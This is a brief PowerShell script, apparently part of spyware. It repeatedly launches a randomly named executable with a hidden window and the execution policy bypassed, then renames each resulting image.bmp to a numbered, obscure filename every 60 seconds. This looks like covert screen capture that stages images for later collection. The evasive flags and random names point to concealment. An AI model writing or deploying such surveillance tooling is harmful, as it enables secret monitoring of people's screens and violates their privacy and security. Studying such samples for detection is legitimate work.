$count=0
while($true){
    powershell -noP -ep bypass -w hidden ".\KJUwHZlCNV.exe"
    while(Test-Path -Path ".\TmreCWpLEnhx$count.bmp"){
        $count++
    }
    $file_name="TmreCWpLEnhx$count.bmp"
    Move-Item -Path ".\image.bmp" -Destination ".\$file_name"
    Start-Sleep -Seconds 60
}